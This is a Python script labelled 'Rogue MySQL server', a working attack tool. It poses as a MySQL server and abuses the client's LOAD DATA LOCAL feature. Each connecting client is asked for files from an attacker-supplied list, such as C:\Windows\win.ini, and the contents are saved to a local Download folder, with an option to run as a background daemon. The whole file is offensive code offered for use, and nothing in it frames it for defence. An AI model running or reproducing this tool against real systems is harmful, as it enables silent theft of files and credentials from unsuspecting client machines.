#!/usr/bin/env python
#coding: utf8


import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers
import argparse
import os



PORT = 3305
LOG_FILE = 'mysql.log'
VERBOSE = False
SAVE_FOLDER = os.sep.join(os.path.abspath(__file__).split(os.sep)[:-1]) + os.sep + 'Download' + os.sep

log = logging.getLogger(__name__)

log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler(LOG_FILE, 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = [
    #'C:\\Windows\\win.ini',
]


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Alexey'
parser = argparse.ArgumentParser(description='Rogue MySQL server')
parser.add_argument("-p", "--port", type=int)
parser.add_argument("-f", "--files", help="Path to file with list of files for download.")
parser.add_argument("-v", "--verbose", action='store_true', help='Print files content in console.')

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct('<HbB')
    packet_header_long = struct.Struct('<HbbB')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num % 255)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num % 255)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.file_number = 0
        self.current_filename = ''
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',  # Protocol
                    '5.6.28-0ubuntu0.14.04.1' + '\0',
                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                ))            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)
        #print("Pushed DATA: %s %s" % (data, data.encode('hex')))

    def collect_incoming_data(self, data):
        log.debug('Data received: %r', data)
        self.ibuffer.append(data)
        #print("Received DATA: %s %s" % (data, data.encode('hex')))

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        self.current_filename = filelist[self.file_number]
                        self.file_number += 1
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(self.current_filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)
                        if len(data) == 1:
                            if packet.packet_num < 256 and self.file_number < len(filelist) - 1:
                                self.current_filename = filelist[self.file_number]
                                self.file_number = (self.file_number + 1) % len(filelist)
                                self.set_terminator(3)
                                self.state = 'LEN'
                                self.sub_state = 'File'
                                self.push(
                                    mysql_packet(packet, '\xFB{0}'.format(self.current_filename))
                                )
                            else:
                                if VERBOSE:
                                    print('***Need new query or all found files were downloaded***')
                                self.push(
                                    mysql_packet(packet, '\0\0\0\x02\0\0\0')
                                )
                                raise LastPacket()
                        else:
                            with open(SAVE_FOLDER + os.path.normpath(self.current_filename).split(os.sep)[-1], 'wb') as fl:
                                fl.write(data)
                            if VERBOSE:
                                print('***File %s obtained.***\n%s' % (self.current_filename, data[1:]))
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)

if __name__ == '__main__':
    args = parser.parse_args()
    if args.files:
        filelist += open(args.files, 'r').read().split('\n')
    if args.port:
        PORT = args.port
    if args.verbose:
        VERBOSE = args.verbose
    if not os.path.exists(SAVE_FOLDER):
        os.mkdir(SAVE_FOLDER)

    z = mysql_listener()
    #daemonize()
    asyncore.loop()
